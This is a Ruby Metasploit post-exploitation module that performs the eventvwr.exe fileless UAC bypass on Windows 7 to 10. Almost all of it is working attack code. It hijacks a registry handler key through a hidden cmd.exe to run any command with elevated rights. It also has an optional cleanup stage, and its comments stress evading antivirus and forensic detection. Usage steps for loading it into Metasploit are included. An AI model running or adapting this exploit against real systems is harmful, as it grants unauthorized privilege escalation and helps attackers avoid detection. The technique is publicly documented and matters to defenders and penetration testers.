##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : enigma_fileless_uac_bypass.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : enigma0x3 | mattifestation
# Tested on      : Windows 7 | Windows 8 | Windows 10
# POC: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
#
#
# [ DESCRIPTION ]
# Most of the UAC bypass techniques require dropping a file to disk (for example, placing a DLL on disk
# to perform a DLL hijack). The technique used in this module differs from the other public methods and
# provides a useful new technique that does not rely on a privileged file copy, code injection, or placing
# a traditional file on disk.
#
# As a normal user, you have write access to keys in HKCU, if an elevated process interacts with keys you
# are able to manipulate you can potentially interfere with actions a high-integrity process is attempting
# to perform. (hijack the process being started), Due to the fact that I was able to hijack the process,
# it is possible to simply execute whatever malicious cmd.exe command you wish. This means that code execution
# has been achieved in a high integrity process (bypassing UAC) without dropping a DLL or other file down to
# the file system. This significantly reduces the risk to the attacker because they aren’t placing a traditional
# file on the file system that can be caught by AV/HIPS or forensically identified later.
# "This module differs from OJ msf module because it uses cmd.exe insted of powershell.exe"
#
#
#
#
# [ MODULE DEFAULT OPTIONS ]
# The session number to run this module on  => set SESSION 3
# The cmd.exe command to be executed        => set CMD_COMMAND start firefox.exe www.househot.com
# Delete malicious registry key hive?       => set DEL_REGKEY true
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/enigma_fileless_uac_bypass
# msf post(enigma_fileless_uac_bypass) > info
# msf post(enigma_fileless_uac_bypass) > show options
# msf post(enigma_fileless_uac_bypass) > show advanced options
# msf post(enigma_fileless_uac_bypass) > set [option(s)]
# msf post(enigma_fileless_uac_bypass) > exploit
##



# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'enigma fileless uac bypass [RCE]',
                        'Description'   => %q{
                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe insted of powershell.exe (OJ msf module). This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the CMD_COMMAND parameter, and runs eventvwr.exe (hijacking the process being started to gain code execution).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln dicover : enigma0x3 | @mattifestation', # credits
                                ],
 
                        'Version'        => '$Revision: 1.2',
                        'DisclosureDate' => 'jan 3 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false', # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 | Windows 8 | Windows 10
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1', # Default its to run againts session 1
                                         'CMD_COMMAND' => 'start notepad.exe', # Default cmd command (demo)
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('CMD_COMMAND', [ false, 'The cmd command to be executed']),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                        ], self.class)

        end




# -------------------------------------------------------
# GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
# -------------------------------------------------------
def ls_stage1

  r=''
  session = client
  exec_comm = datastore['CMD_COMMAND']                         # my cmd command to execute
  comm_path = '%SystemRoot%\\System32\\cmd.exe /c'             # %comspec% path 
  vul_serve = '%SystemRoot%\\System32\\eventvwr.exe'           # vulnerable soft to be hijacked
  regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
  comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f" # injection registry oneliner command
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['CMD_COMMAND'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set CMD_COMMAND option!")
    return nil
  else
    print_status("Hijacking eventvwr.exe process!")
    Rex::sleep(1.5)
  end


    # search in target regedit if eventvwr calls mmc.exe
    print_warning("Reading proccess registry hive keys...")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
      print_good(" Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_error("Post-module cant find the registry hive key needed...")
       print_error("System does not apper to be vuln to the exploit code!")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

 # Execute process hijacking in registry...
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
 print_good(" Hijacking proccess to gain code execution...")
 r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit
 Rex::sleep(3.0)

      # start remote service to gain code execution
      print_good(" Starting eventvwr.exe native proccess...")
      r = session.sys.process.execute("cmd.exe /c #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
      Rex::sleep(1.0)

    # close channel when done
    print_status("Credits: enigma0x3 + @mattifestation")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ----------------------------------------------------
# DELETE MALICIOUS REGISTRY ENTRY (proccess hijacking)
# ----------------------------------------------------
def ls_stage2

  r=''
  session = client
  reg_clean = 'REG DELETE HKCU\\Software\\Classes\\mscfile /f' # registry hive to be clean
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DEL_REGKEY'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DEL_REGKEY option!")
    return nil
  else
    print_status("Revert eventvwr.exe process hijack!")
    Rex::sleep(1.5)
  end

    # search in target regedit if hijacking method allready exists
    print_warning("Reading proccess registry hive keys...")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
      print_good(" Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_error("Post-module cant find the registry hive key needed...")
       print_error("System does not apper to be vuln to the exploit code!")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

 # Delete hijacking hive keys from target regedit...
 # REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f
 print_good(" Deleting hive registry keys...")
 r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit
 Rex::sleep(3.0)

    # close channel when done
    print_status("registry hijack reverted to default stage")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    | enigma fileless UAC bypass command execution |")
    print_line("    |             Author: r00t-3xp10it             |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    # check for proper session (meterpreter)
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end

 
# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['CMD_COMMAND']
         ls_stage1
      end

      if datastore['DEL_REGKEY']
         ls_stage2
      end
   end
end
